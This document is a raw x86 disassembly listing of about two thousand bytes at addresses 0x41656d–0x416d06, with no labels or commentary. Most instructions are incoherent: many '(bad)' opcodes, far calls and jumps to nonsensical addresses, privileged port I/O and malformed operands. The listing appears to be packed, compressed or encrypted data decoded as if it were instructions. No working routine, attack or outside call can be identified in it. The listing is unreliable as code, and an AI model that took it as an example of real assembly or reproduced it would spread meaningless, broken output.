  41656d:	not    DWORD PTR [esi]
  41656f:	inc    ebx
  416570:	rcl    BYTE PTR [edi-0x5009fee5],1
  416576:	ja     0x416544
  416578:	mov    ch,0x5a
  41657a:	dec    ecx
  41657b:	pop    ss
  41657c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41657d:	adc    al,0xce
  41657f:	xor    eax,0xb159f791
  416584:	call   0x66c2fb2d
  416589:	xlat   BYTE PTR ds:[ebx]
  41658a:	fnstenv [ebp-0x13]
  41658d:	loop   0x4165d4
  41658f:	adc    dh,ah
  416591:	dec    edi
  416592:	inc    ecx
  416593:	mov    ?,WORD PTR [ebp-0x45]
  416596:	addr16 inc edi
  416598:	les    ebx,FWORD PTR [esi+0x40]
  41659b:	xchg   esp,eax
  41659c:	ins    BYTE PTR es:[edi],dx
  41659d:	fmul   QWORD PTR [esi+0x5c4fba83]
  4165a3:	(bad)
  4165a6:	pop    edi
  4165a7:	hlt    
  4165a8:	data16 mov dh,0x51
  4165ab:	hlt    
  4165ac:	mov    ebp,esi
  4165ae:	ror    DWORD PTR [eax-0x20],cl
  4165b1:	and    DWORD PTR [edx],edx
  4165b3:	pushf  
  4165b4:	cmp    DWORD PTR [ecx],0xcab33c60
  4165ba:	sub    ah,ch
  4165bc:	mov    al,0x12
  4165be:	mov    bl,0x3d
  4165c0:	cwde   
  4165c1:	pop    edi
  4165c2:	adc    al,0x24
  4165c4:	push   0x71
  4165c6:	ror    DWORD PTR ss:[ecx+0x68699ff5],cl
  4165cd:	xchg   ebx,eax
  4165ce:	sbb    ebx,DWORD PTR [ecx+eiz*1-0x32872292]
  4165d5:	mov    eax,fs
  4165d7:	aad    0xdf
  4165d9:	pushf  
  4165da:	push   es
  4165db:	aaa    
  4165dc:	xor    ch,al
  4165de:	icebp  
  4165df:	fwait
  4165e0:	mov    al,ds:0xc34c2bc6
  4165e5:	jge    0x416581
  4165e7:	jl     0x41665a
  4165e9:	daa    
  4165ea:	and    al,BYTE PTR [edx]
  4165ec:	les    edi,FWORD PTR [edx-0x44c65c5e]
  4165f2:	jp     0x416629
  4165f4:	xchg   dh,bh
  4165f6:	jb     0x416668
  4165f8:	xchg   edx,eax
  4165f9:	test   BYTE PTR [esi],0x98
  4165fc:	adc    BYTE PTR [esi],bh
  4165fe:	or     al,0x8b
  416600:	ins    DWORD PTR es:[edi],dx
  416601:	mov    BYTE PTR gs:[esi-0x1d8f7f91],al
  416608:	or     edi,0xffffffd4
  41660b:	mov    ah,0x2
  41660d:	xor    ecx,DWORD PTR [eax+edi*8+0x5de98b4e]
  416614:	rcl    DWORD PTR [ecx],0x59
  416617:	pushf  
  416618:	das    
  416619:	sbb    al,0x9d
  41661b:	cdq    
  41661c:	sbb    al,0x5f
  41661e:	push   ebx
  41661f:	ins    BYTE PTR es:[edi],dx
  416620:	test   DWORD PTR [esi],esp
  416622:	retf   0xaf58
  416625:	pop    edi
  416626:	cli    
  416627:	mov    dl,0x71
  416629:	mov    WORD PTR [edx+0x2a5395e7],cs
  41662f:	xor    eax,0xd7201921
  416634:	rcr    BYTE PTR [edi],1
  416636:	stos   DWORD PTR es:[edi],eax
  416637:	bound  eax,QWORD PTR [eax+edi*8]
  41663a:	mov    ds:0x9208c633,eax
  41663f:	add    eax,0x6ffff88d
  416644:	and    bl,dl
  416646:	dec    ecx
  416647:	mov    dh,0xb8
  416649:	dec    ebp
  41664a:	aas    
  41664b:	cmp    al,cl
  41664d:	lahf   
  41664e:	sbb    eax,0xe80aad6d
  416653:	xchg   DWORD PTR [edi+0x9],ebx
  416656:	cs mov dl,0x4d
  416659:	xor    BYTE PTR [edi+0x6a2f8b5f],cl
  41665f:	out    dx,eax
  416660:	jle    0x4166c7
  416662:	sahf   
  416663:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416664:	out    0xba,al
  416666:	loope  0x4165eb
  416668:	push   eax
  416669:	pop    eax
  41666a:	jne    0x416629
  41666c:	mov    dh,0x4c
  41666e:	or     DWORD PTR [esi],esp
  416670:	ss into 
  416672:	test   edx,ebp
  416674:	jecxz  0x416693
  416676:	stc    
  416677:	and    ebp,ebx
  416679:	push   esp
  41667a:	push   ss
  41667b:	xor    DWORD PTR [eax+0x739da1ae],esi
  416681:	loop   0x41661b
  416683:	xchg   esp,eax
  416684:	int3   
  416685:	ret    0x2a2d
  416688:	and    ah,BYTE PTR [ecx-0x34]
  41668b:	adc    ecx,ecx
  41668d:	xchg   esi,eax
  41668e:	fisttp DWORD PTR [edx+eiz*8-0x73f3700c]
  416695:	jmp    0x416674
  416697:	fs popf 
  416699:	jns    0x41662c
  41669b:	stos   DWORD PTR es:[edi],eax
  41669c:	cmp    ch,dl
  41669e:	daa    
  41669f:	test   eax,0x1f5f8911
  4166a4:	push   0xffffffbc
  4166a6:	out    0xa1,al
  4166a8:	icebp  
  4166a9:	sub    BYTE PTR [ecx-0x2bfee6ae],bl
  4166af:	or     al,0xe9
  4166b1:	jp     0x4166b8
  4166b3:	out    dx,al
  4166b4:	dec    ebp
  4166b5:	and    DWORD PTR [ebx+0x24],edi
  4166b8:	push   es
  4166b9:	mov    esi,0x91dcce2d
  4166be:	ret    0xdb77
  4166c1:	push   es
  4166c2:	sahf   
  4166c3:	mov    bh,0x5d
  4166c5:	or     DWORD PTR [ebx+0x381a4d7e],esp
  4166cb:	in     al,0xd6
  4166cd:	bound  ecx,QWORD PTR [eax]
  4166cf:	call   0x183c:0xf081f481
  4166d6:	ja     0x416660
  4166d8:	sahf   
  4166d9:	cmp    DWORD PTR [esi],ebx
  4166db:	sub    al,0xc3
  4166dd:	clc    
  4166de:	mov    BYTE PTR [edx+0x10],ah
  4166e1:	test   BYTE PTR [edi-0x70],cl
  4166e4:	nop
  4166e5:	inc    eax
  4166e6:	mov    bl,BYTE PTR [ebx-0x26]
  4166e9:	out    dx,al
  4166ea:	fadd   DWORD PTR [ecx]
  4166ec:	add    eax,0x5225489e
  4166f1:	jnp    0x41671b
  4166f3:	or     DWORD PTR [ebx],eax
  4166f5:	call   0x4ced:0x741a2634
  4166fc:	mov    ds:0xa3beb335,al
  416701:	adc    al,0x90
  416703:	add    BYTE PTR [eax],dh
  416705:	into   
  416706:	pop    eax
  416707:	sahf   
  416708:	fcmovb st,st(5)
  41670a:	call   0x752c92dc
  41670f:	add    esp,DWORD PTR [ebx+0x4fb27c8e]
  416715:	dec    eax
  416716:	pushf  
  416717:	or     edi,DWORD PTR [esi-0x55391472]
  41671d:	mov    esi,0x226203cd
  416722:	je     0x41675a
  416724:	xchg   DWORD PTR [edi-0x2],esi
  416727:	or     ebp,ebp
  416729:	jp     0x4166b6
  41672b:	push   esi
  41672c:	cwde   
  41672d:	mov    al,0x84
  41672f:	pop    esp
  416730:	dec    edi
  416731:	jle    0x4167ab
  416733:	or     edi,edi
  416735:	fst    DWORD PTR [edx-0x692c8819]
  41673b:	scas   al,BYTE PTR es:[edi]
  41673c:	adc    bl,BYTE PTR [edi+0x24]
  41673f:	xchg   esp,eax
  416740:	in     al,dx
  416741:	(bad)  
  416742:	mov    al,0x67
  416744:	inc    ebp
  416745:	cmp    bh,BYTE PTR [ebx]
  416747:	sar    ebx,cl
  416749:	dec    esi
  41674a:	loopne 0x4167c7
  41674c:	mov    cs,WORD PTR [ebx-0x3c]
  41674f:	jbe    0x278e85e2
  416755:	push   eax
  416756:	jg     0x416741
  416758:	fldcw  WORD PTR [edx+edx*8]
  41675b:	push   ss
  41675c:	jmp    0xf3d0cc31
  416761:	out    dx,al
  416762:	and    al,0x3d
  416764:	xchg   edx,eax
  416765:	(bad)  
  416766:	cld    
  416767:	es jg  0x41672e
  41676a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41676b:	jmp    0x2d74:0xfa6ae841
  416772:	data16 mov BYTE PTR [eax+0x1f],cl
  416776:	rol    DWORD PTR ds:[ecx-0x26c8ebf0],1
  41677d:	mov    edx,ecx
  41677f:	test   DWORD PTR [ecx+0x64],esp
  416782:	mov    ebp,0xe0824580
  416787:	fs cld 
  416789:	gs stos BYTE PTR es:[edi],al
  41678b:	cmp    al,0xc
  41678d:	fcomp  DWORD PTR [ebx+0x4183f]
  416793:	pop    edi
  416794:	mov    eax,ds:0x7b7105cb
  416799:	stos   BYTE PTR es:[edi],al
  41679a:	call   0xb0c9caca
  41679f:	(bad)  
  4167a0:	ins    BYTE PTR es:[edi],dx
  4167a1:	scas   eax,DWORD PTR es:[edi]
  4167a2:	call   0x2493:0x16d62af2
  4167a9:	mov    eax,ds:0xfeb8dd2c
  4167ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167af:	cdq    
  4167b0:	sbb    edi,DWORD PTR [ecx+edi*8+0x5c]
  4167b4:	(bad)  [ecx+ecx*2-0x53fc5f30]
  4167bb:	pushf  
  4167bc:	dec    ebx
  4167bd:	scas   al,BYTE PTR es:[edi]
  4167be:	imul   ecx,DWORD PTR [esi],0x2c2d7a51
  4167c4:	es xchg edi,eax
  4167c6:	inc    ebx
  4167c7:	fadd   DWORD PTR [edx-0x16]
  4167ca:	stos   BYTE PTR es:[edi],al
  4167cb:	lods   eax,DWORD PTR ds:[esi]
  4167cc:	jmp    0x372a43dc
  4167d1:	jecxz  0x41684d
  4167d3:	into   
  4167d4:	add    eax,eax
  4167d6:	sub    DWORD PTR ds:0x926d8eb4,ecx
  4167dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167dd:	sbb    al,0xa
  4167df:	cmp    DWORD PTR [eax+ebp*4],0xffffff8f
  4167e3:	lods   eax,DWORD PTR ds:[esi]
  4167e4:	hlt    
  4167e5:	out    dx,al
  4167e6:	leave  
  4167e7:	in     eax,0xcf
  4167e9:	sbb    ebx,esi
  4167eb:	dec    ecx
  4167ec:	or     al,0x8b
  4167ee:	out    0xc8,al
  4167f0:	add    esi,DWORD PTR [ecx+0x7f]
  4167f3:	dec    esp
  4167f4:	test   BYTE PTR [esi+eiz*2+0x19],ah
  4167f8:	sti    
  4167f9:	in     al,0x75
  4167fb:	jae    0x4167f2
  4167fd:	es pop es
  4167ff:	fcmovnbe st,st(5)
  416801:	pusha  
  416802:	mul    cl
  416804:	xchg   esi,eax
  416805:	mov    bh,0x25
  416807:	rcr    DWORD PTR [ebp+0x17],0xf4
  41680b:	mov    bh,0x1d
  41680d:	in     eax,dx
  41680e:	cmp    esp,DWORD PTR [ecx+0x7]
  416811:	xlat   BYTE PTR ds:[ebx]
  416812:	jmp    FWORD PTR [ebp+0x16]
  416815:	jmp    0xf461c30f
  41681a:	jne    0x416850
  41681c:	sub    BYTE PTR [esi],dl
  41681e:	pop    eax
  41681f:	xlat   BYTE PTR ds:[ebx]
  416820:	lahf   
  416821:	stc    
  416822:	sub    BYTE PTR [edi+0x7f],cl
  416825:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416827:	mov    ch,bl
  416829:	mov    cl,0x2f
  41682b:	(bad)  
  41682c:	xlat   BYTE PTR ds:[ebx]
  41682d:	cli    
  41682e:	test   al,0xfe
  416830:	xor    ah,BYTE PTR [eax-0x64]
  416833:	loope  0x416823
  416835:	out    0x29,al
  416837:	pusha  
  416838:	adc    BYTE PTR [esi+0x16],ah
  41683b:	mov    gs,WORD PTR [ebx+eiz*2+0x4196e33f]
  416842:	mov    bh,0xb3
  416844:	aad    0x72
  416846:	int    0xa1
  416848:	sub    ecx,DWORD PTR [ebx-0x36ccf7ab]
  41684e:	add    ecx,DWORD PTR ds:0x42a321
  416854:	mov    edi,DWORD PTR ds:0x42a429
  41685a:	sub    edi,ecx
  41685c:	sub    ecx,DWORD PTR [ecx+edi*1]
  41685f:	jmp    0x416d71
  416864:	(bad)  
  416865:	xlat   BYTE PTR ds:[ebx]
  416866:	cmp    al,0xc6
  416868:	int3   
  416869:	fxch   st(1)
  41686b:	aad    0x41
  41686d:	ins    BYTE PTR es:[edi],dx
  41686e:	test   eax,0xf2ff57c7
  416873:	sub    ebp,ebx
  416875:	(bad)  
  416876:	jg     0x4168f0
  416878:	jae    0x4168f6
  41687a:	js     0x4168f4
  41687c:	mov    ebx,0x248d6f16
  416881:	test   al,0x97
  416883:	and    BYTE PTR [ecx-0x1d3a6fc6],0xa0
  41688a:	(bad)  
  41688b:	enter  0xde39,0x6b
  41688f:	leave  
  416890:	aad    0x13
  416892:	test   eax,0x22bbc189
  416897:	icebp  
  416898:	fs lock mov bl,0x2d
  41689c:	dec    ebx
  41689d:	iret   
  41689e:	mov    edx,0x64703620
  4168a3:	jmp    0xffce:0xa0280319
  4168aa:	(bad)  
  4168ab:	fcomp  DWORD PTR [ecx-0x2d]
  4168ae:	jns    0x4168a3
  4168b0:	push   edi
  4168b2:	ja     0x4168fd
  4168b4:	popf   
  4168b5:	dec    edi
  4168b6:	jae    0x41685e
  4168b8:	push   edi
  4168b9:	imul   esi,DWORD PTR [edx-0x6b52153b],0xf
  4168c0:	dec    edi
  4168c1:	jne    0x4168b7
  4168c3:	xchg   ebx,eax
  4168c4:	fimul  DWORD PTR [edi]
  4168c6:	inc    ecx
  4168c7:	hlt    
  4168c8:	jge    0x4168b5
  4168ca:	jae    0x416900
  4168cc:	mov    edx,0x4774f70
  4168d1:	mov    edi,DWORD PTR [edi-0x50b1b7b0]
  4168d7:	and    al,0xdc
  4168d9:	ret    0x7b85
  4168dc:	je     0x4168eb
  4168de:	in     eax,0xe8
  4168e0:	or     al,0xdb
  4168e2:	xchg   ch,cl
  4168e4:	xor    al,0x1c
  4168e6:	jne    0x416940
  4168e8:	jg     0x416887
  4168ea:	push   esi
  4168eb:	cmp    al,0x3b
  4168ed:	or     bh,dh
  4168ef:	push   esi
  4168f0:	pop    ebp
  4168f1:	add    ebx,DWORD PTR [edi]
  4168f3:	call   0x334d5797
  4168f8:	xchg   BYTE PTR [edi+esi*4-0x70],bh
  4168fc:	and    ebx,esp
  4168fe:	test   bl,ch
  416900:	jns    0x4168a9
  416902:	(bad)  
  416903:	xchg   edi,eax
  416904:	pop    ebx
  416905:	push   eax
  416906:	rcr    dl,0x58
  416909:	inc    ebp
  41690a:	and    bh,BYTE PTR [ecx]
  41690c:	sbb    DWORD PTR [ecx],ebp
  41690e:	xchg   edi,eax
  41690f:	stos   DWORD PTR es:[edi],eax
  416910:	clc    
  416911:	mov    ah,0x7e
  416913:	jmp    0x41695e
  416915:	fcom   QWORD PTR [ebp-0x4e6a607b]
  41691b:	mov    dh,0x2e
  41691d:	dec    esp
  41691e:	imul   esi,DWORD PTR [edi],0xffffff88
  416921:	sbb    BYTE PTR [edx+eiz*2-0x43],bh
  416925:	push   ds
  416926:	movq   QWORD PTR [edi-0x3a],mm3
  41692a:	shl    BYTE PTR [ecx-0x44],1
  41692d:	js     0x416915
  41692f:	xchg   esi,eax
  416930:	lea    esp,[ecx-0x32]
  416933:	add    al,0xe1
  416935:	jmp    0x416911
  416937:	xchg   edi,eax
  416938:	repz aam 0x59
  41693b:	dec    eax
  41693c:	mov    DWORD PTR [edi-0x2],ebp
  41693f:	ret    
  416940:	sub    eax,ecx
  416942:	cmp    esi,eax
  416944:	sbb    ebx,DWORD PTR [ebx]
  416946:	ss pop ebp
  416948:	mov    BYTE PTR [esi],dh
  41694a:	sub    BYTE PTR [edx+0x5963e945],dh
  416950:	out    dx,al
  416951:	enter  0xd85a,0xb7
  416955:	add    al,0x8e
  416957:	aad    0xce
  416959:	ins    BYTE PTR es:[edi],dx
  41695a:	(bad)  
  41695b:	xor    BYTE PTR [edi-0x44],ch
  41695e:	or     edi,0x9fdcf070
  416964:	ret    0x4e9d
  416967:	leave  
  416968:	ins    DWORD PTR es:[edi],dx
  416969:	retf   
  41696a:	call   0xf60d:0x4809120c
  416971:	(bad)  
  416972:	std    
  416973:	ins    DWORD PTR es:[edi],dx
  416974:	jbe    0x416991
  416976:	outs   dx,DWORD PTR ds:[esi]
  416977:	push   eax
  416978:	add    bh,dl
  41697a:	inc    BYTE PTR [esi+0x50]
  41697d:	addr16 push 0xffffff94
  416980:	pop    eax
  416981:	and    eax,0x8273742c
  416986:	shl    BYTE PTR [edi+0x4d],1
  416989:	data16 and BYTE PTR [ebx],0xc5
  41698d:	and    eax,0x10c97d71
  416992:	adc    ah,bl
  416994:	(bad)  
  416995:	mov    bh,0x8e
  416997:	push   cs
  416998:	jns    0x4169e0
  41699a:	dec    edx
  41699b:	int    0x41
  41699d:	popf   
  41699e:	lahf   
  41699f:	stc    
  4169a0:	fcmovu st,st(2)
  4169a2:	ins    DWORD PTR es:[edi],dx
  4169a3:	inc    esi
  4169a4:	(bad)  
  4169a7:	in     al,dx
  4169a8:	ss sub al,0x9e
  4169ab:	inc    esi
  4169ac:	mul    BYTE PTR [ebx-0x494e713f]
  4169b2:	outs   dx,BYTE PTR ds:[esi]
  4169b3:	and    BYTE PTR [eax],ch
  4169b5:	lods   al,BYTE PTR ds:[esi]
  4169b6:	push   0xf68744ae
  4169bb:	je     0x416a3c
  4169bd:	dec    ebx
  4169be:	sbb    ecx,DWORD PTR [edx]
  4169c0:	or     dl,BYTE PTR [eax+eax*8-0x19]
  4169c4:	cmpxchg BYTE PTR [edi+ebp*2+0x1f434be4],bh
  4169cc:	xchg   esi,eax
  4169cd:	mov    WORD PTR [edi-0xf],?
  4169d0:	xor    esi,DWORD PTR [eax-0x3339629e]
  4169d6:	jle    0x41695b
  4169d8:	jmp    0x3d3ea9b1
  4169dd:	rcl    BYTE PTR [edx-0xe4333f3],0x6d
  4169e4:	adc    al,0xf0
  4169e6:	call   0x43237d0d
  4169eb:	sbb    BYTE PTR [ecx],0xda
  4169ee:	out    0xc9,al
  4169f0:	pop    ds
  4169f1:	test   BYTE PTR [esp+edi*4+0x1123743],bh
  4169f8:	pop    edx
  4169f9:	retf   0x7031
  4169fc:	push   esi
  4169fd:	jmp    0x4c0b74f1
  416a02:	ins    DWORD PTR es:[edi],dx
  416a03:	xor    esi,edx
  416a05:	xchg   edx,eax
  416a06:	sub    ch,ch
  416a08:	pop    ebp
  416a09:	jnp    0x416a1f
  416a0b:	inc    ebp
  416a0c:	jns    0x416a20
  416a0e:	or     DWORD PTR [edx-0x6d8022c8],edx
  416a14:	loop   0x416a95
  416a16:	inc    ebp
  416a17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a18:	mov    ebx,0x53f1037
  416a1d:	cs (bad) 
  416a1f:	pop    ss
  416a20:	cmp    eax,0x7a2571bf
  416a25:	test   eax,0x562f624a
  416a2a:	or     DWORD PTR [ebp-0x3b3f83f5],eax
  416a30:	inc    esp
  416a31:	(bad)  
  416a32:	icebp  
  416a33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a34:	add    esi,DWORD PTR [eax+0x5059b2a3]
  416a3a:	and    eax,0x2d44cfac
  416a3f:	and    ebp,DWORD PTR [esi+0x7f20d041]
  416a45:	int    0xe7
  416a47:	sub    eax,0x14df4b00
  416a4c:	data16 mov cl,0xd1
  416a4f:	pop    esp
  416a50:	and    al,0x9f
  416a52:	not    DWORD PTR [edi]
  416a54:	ja     0x416acd
  416a56:	not    BYTE PTR [ebp-0x34]
  416a59:	inc    edi
  416a5b:	in     al,0xb6
  416a5d:	or     eax,0x7759a395
  416a62:	nop
  416a63:	aas    
  416a64:	push   edi
  416a65:	mov    edx,0x6cfe05f3
  416a6a:	mov    eax,ds:0x38532f01
  416a6f:	mov    edx,0xcf814ef0
  416a74:	cmc    
  416a75:	push   ss
  416a76:	mov    al,ds:0xd3d71cc0
  416a7b:	iret   
  416a7c:	jl     0x416a63
  416a7e:	out    dx,al
  416a7f:	data16 mov ch,0x66
  416a82:	mov    esp,ebx
  416a84:	scas   al,BYTE PTR es:[edi]
  416a85:	xchg   BYTE PTR [esi+0x1d8214b1],ch
  416a8b:	and    al,0x52
  416a8d:	add    bl,bh
  416a8f:	out    0x71,al
  416a91:	lods   eax,DWORD PTR ds:[esi]
  416a92:	dec    ebx
  416a93:	mov    dh,0xff
  416a95:	dec    edx
  416a96:	(bad)  
  416a97:	fsubr  QWORD PTR [esi-0x25f9ff5b]
  416a9d:	sbb    ebp,DWORD PTR [edx-0x47]
  416aa0:	call   0xacdd:0xacd16526
  416aa7:	inc    esp
  416aa8:	dec    ecx
  416aa9:	pop    esp
  416aaa:	int3   
  416aab:	test   DWORD PTR [edi],ebp
  416aad:	xchg   BYTE PTR [edx+0x5c6b7226],cl
  416ab3:	int3   
  416ab4:	je     0x416a61
  416ab6:	jmp    0xc482:0x118c9ccb
  416abd:	jg     0x416a87
  416abf:	push   edx
  416ac0:	je     0x416af7
  416ac2:	outs   dx,BYTE PTR ds:[esi]
  416ac3:	inc    ecx
  416ac4:	adc    BYTE PTR [ebx+0x18],0x60
  416ac8:	push   eax
  416ac9:	inc    ebp
  416aca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416acb:	mul    DWORD PTR [ebx+esi*1+0x16]
  416acf:	mov    edx,eax
  416ad1:	(bad)  
  416ad3:	mov    ecx,0xbaf4f82c
  416ad8:	jmp    0xa0a997d6
  416add:	xlat   BYTE PTR ds:[ebx]
  416ade:	mov    eax,ds:0xe4ce7704
  416ae3:	cmp    DWORD PTR [eax],esp
  416ae5:	add    al,0xd0
  416ae7:	adc    eax,0xcf461394
  416aec:	je     0x416ab3
  416aee:	xor    al,0xd4
  416af0:	push   esi
  416af1:	das    
  416af2:	cmp    ebp,DWORD PTR [ecx-0x3a]
  416af5:	mov    dl,BYTE PTR [edi]
  416af7:	sub    eax,0xd5387ca4
  416afc:	push   ebp
  416afd:	cdq    
  416afe:	jnp    0x416b3c
  416b00:	sbb    eax,0xe24a76d6
  416b05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b06:	fucompp 
  416b08:	shr    DWORD PTR [eax*8+0x60966e57],1
  416b0f:	shl    DWORD PTR [ebx],0xec
  416b12:	push   ss
  416b13:	pop    ds
  416b14:	out    0x7d,al
  416b16:	in     al,dx
  416b17:	pop    ebp
  416b18:	popa   
  416b19:	mov    dl,0xd3
  416b1b:	sar    BYTE PTR [ebp+0x49],1
  416b1e:	popf   
  416b1f:	push   esi
  416b20:	and    al,BYTE PTR [esi+0x1fd1bcb7]
  416b26:	inc    edx
  416b27:	xor    BYTE PTR [ebp-0x623db762],dh
  416b2d:	in     al,dx
  416b2e:	add    al,BYTE PTR [edi-0xc]
  416b31:	out    dx,al
  416b32:	in     al,0x2d
  416b34:	xchg   ecx,eax
  416b35:	xchg   esi,ecx
  416b37:	or     eax,DWORD PTR [edi+0x3a]
  416b3a:	mov    dh,0x3a
  416b3c:	fcmovnb st,st(3)
  416b3e:	ss pusha 
  416b40:	push   ss
  416b41:	repnz fist WORD PTR [ebp-0x59]
  416b45:	jno    0x416bbd
  416b47:	pop    esp
  416b48:	adc    cl,ch
  416b4a:	stc    
  416b4b:	mov    eax,ds:0x5e3b4ffc
  416b50:	sahf   
  416b51:	not    BYTE PTR [ecx]
  416b53:	jns    0x416b23
  416b55:	rol    DWORD PTR [eax-0x9],cl
  416b58:	pusha  
  416b59:	in     eax,dx
  416b5a:	sar    BYTE PTR [ebx-0x5c],1
  416b5d:	sub    esi,ebp
  416b5f:	ins    BYTE PTR es:[edi],dx
  416b60:	shl    al,0x47
  416b63:	aad    0xf8
  416b65:	and    al,0xce
  416b67:	sar    BYTE PTR [ecx-0xa],1
  416b6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b6b:	xor    BYTE PTR [esi+0x4883ae5a],dh
  416b71:	mov    ds:0xe15b62d5,eax
  416b76:	adc    ebx,edi
  416b78:	fld    TBYTE PTR [esi-0x2c]
  416b7b:	jecxz  0x416be9
  416b7d:	mov    ch,ch
  416b7f:	jne    0x416b83
  416b81:	into   
  416b82:	xor    al,0x77
  416b84:	inc    ebx
  416b85:	fidivr DWORD PTR [ebp-0x5609fad1]
  416b8b:	push   ss
  416b8c:	fs xor eax,0x112be9e
  416b92:	jno    0x416bf7
  416b94:	mul    DWORD PTR [ecx]
  416b96:	in     al,0x85
  416b98:	leave  
  416b99:	push   ebp
  416b9a:	xchg   ecx,eax
  416b9b:	fimul  WORD PTR [eax-0x5a20c126]
  416ba1:	in     al,0x93
  416ba3:	call   esp
  416ba5:	sbb    ah,BYTE PTR [esi+0x8]
  416ba8:	jmp    0x416b7e
  416baa:	and    bh,BYTE PTR ds:0x29a93c75
  416bb0:	inc    ebp
  416bb1:	jb     0x416bb8
  416bb3:	clc    
  416bb4:	shl    DWORD PTR [esi+0x74],1
  416bb7:	push   0x4801fcd
  416bbc:	fsubr  DWORD PTR [ecx-0x50]
  416bbf:	loop   0x416b4e
  416bc1:	sub    ah,0x24
  416bc4:	push   ss
  416bc5:	xchg   ebp,eax
  416bc6:	pop    ds
  416bc7:	pushf  
  416bc8:	sbb    BYTE PTR [edi-0x2323f44c],bl
  416bce:	mov    ebx,ds
  416bd0:	add    bh,BYTE PTR [ebx+0x5401719b]
  416bd6:	add    BYTE PTR [esi+0x7],dl
  416bd9:	out    0x29,al
  416bdb:	stos   BYTE PTR es:[edi],al
  416bdc:	stos   DWORD PTR es:[edi],eax
  416bdd:	jmp    0x7d01:0xef13c430
  416be4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416be5:	js     0x416bf4
  416be7:	not    DWORD PTR [ecx]
  416be9:	jmp    0xf4b:0xfaf59bac
  416bf0:	aam    0xe2
  416bf2:	mov    cl,0x5a
  416bf4:	out    dx,eax
  416bf5:	dec    ebp
  416bf6:	iret   
  416bf7:	and    ebp,ebx
  416bf9:	cmp    ebp,0xffffff99
  416bfc:	daa    
  416bfd:	outs   dx,DWORD PTR ds:[esi]
  416bfe:	dec    edi
  416bff:	jp     0x416bcf
  416c01:	pop    es
  416c02:	call   0xeed73b66
  416c07:	mov    BYTE PTR [edx],dl
  416c09:	cld    
  416c0a:	ins    DWORD PTR es:[edi],dx
  416c0b:	lds    ebp,FWORD PTR [edi+0x38b737de]
  416c11:	cli    
  416c12:	es inc esi
  416c14:	mov    ebp,DWORD PTR [esi+edi*2]
  416c17:	jmp    0x7afde5f6
  416c1c:	ins    DWORD PTR es:[edi],dx
  416c1d:	sub    BYTE PTR [edx*4+0x43224b90],dh
  416c24:	jmp    0x92d6eaaa
  416c29:	jp     0x416c92
  416c2b:	xor    ah,ah
  416c2d:	scas   eax,DWORD PTR es:[edi]
  416c2e:	mov    ebx,0x4f602785
  416c33:	or     bh,BYTE PTR [ecx]
  416c35:	pop    es
  416c36:	xor    al,BYTE PTR [edx+eax*1-0x40]
  416c3a:	sub    DWORD PTR [edx-0x40],edi
  416c3d:	retf   0x9d42
  416c40:	hlt    
  416c41:	fsub   DWORD PTR [ebx-0x49]
  416c44:	mov    eax,ds:0x35300d9d
  416c49:	pop    ecx
  416c4a:	pop    ecx
  416c4b:	retf   0xb53b
  416c4e:	stos   DWORD PTR es:[edi],eax
  416c4f:	jge    0x416ca2
  416c51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c52:	push   esp
  416c53:	xor    al,0xc8
  416c55:	fldpi  
  416c57:	enter  0x34e3,0xf
  416c5b:	stos   DWORD PTR es:[edi],eax
  416c5c:	mov    ebx,0x51e87efc
  416c61:	push   ebp
  416c62:	pop    esi
  416c63:	dec    ebx
  416c64:	mov    ebx,DWORD PTR [edx+esi*2+0x1ab59254]
  416c6b:	into   
  416c6c:	fbstp  TBYTE PTR [edx+0x49fd4ab6]
  416c72:	jns    0x416cf0
  416c74:	leave  
  416c75:	mov    dh,0x25
  416c77:	int3   
  416c78:	cmp    eax,DWORD PTR [ecx]
  416c7a:	push   edx
  416c7b:	push   ss
  416c7c:	xchg   ecx,eax
  416c7d:	sub    eax,0xb9cfc1e
  416c82:	jl     0x416caa
  416c84:	xor    edx,DWORD PTR [edi]
  416c86:	inc    esi
  416c87:	xchg   esi,eax
  416c88:	aad    0x6a
  416c8a:	icebp  
  416c8b:	and    eax,esi
  416c8d:	and    BYTE PTR [eax-0x57],ah
  416c90:	cld    
  416c91:	cwde   
  416c92:	lds    edx,FWORD PTR ds:0x9a4f2422
  416c98:	push   ecx
  416c99:	std    
  416c9a:	shl    DWORD PTR [eax],0x41
  416c9d:	jnp    0x416cdd
  416c9f:	call   0xdbbf:0xf50f93c3
  416ca6:	jae    0x416c73
  416ca8:	repnz repnz sub al,0xf
  416cac:	pop    edi
  416cad:	addr16 pusha 
  416caf:	sbb    edi,DWORD PTR [ebp+0x286342dd]
  416cb5:	inc    edx
  416cb6:	aam    0xff
  416cb8:	mov    bh,0x32
  416cba:	sti    
  416cbb:	cmp    edi,DWORD PTR [edi-0x3e]
  416cbe:	mov    WORD PTR [edi+edi*2],ds
  416cc1:	jmp    0xf4ba:0x9bbf469d
  416cc8:	inc    eax
  416cc9:	cmp    eax,DWORD PTR [esi+edi*2+0x74]
  416ccd:	push   ss
  416cce:	mov    ds:0x8489717,eax
  416cd3:	iret   
  416cd4:	cmp    al,0xb7
  416cd6:	jb     0x416d42
  416cd8:	sar    edx,0xea
  416cdb:	jl     0x416d43
  416cdd:	sbb    bh,al
  416cdf:	or     BYTE PTR [ebx+0x3f],dh
  416ce2:	cmp    DWORD PTR ds:0x1990953a,esi
  416ce8:	inc    ecx
  416ce9:	call   0xbb4f:0x3919e91c
  416cf0:	pop    edi
  416cf1:	push   0xffffffb9
  416cf3:	xchg   edi,eax
  416cf4:	adc    DWORD PTR [edi+0x14db2663],esp
  416cfa:	and    dl,BYTE PTR [ecx]
  416cfc:	push   cs
  416cfd:	dec    ebp
  416cfe:	lods   eax,DWORD PTR ds:[esi]
  416cff:	mov    ds:0x1937f24,eax
  416d04:	jp     0x416cbf
  416d06:	dec    eax
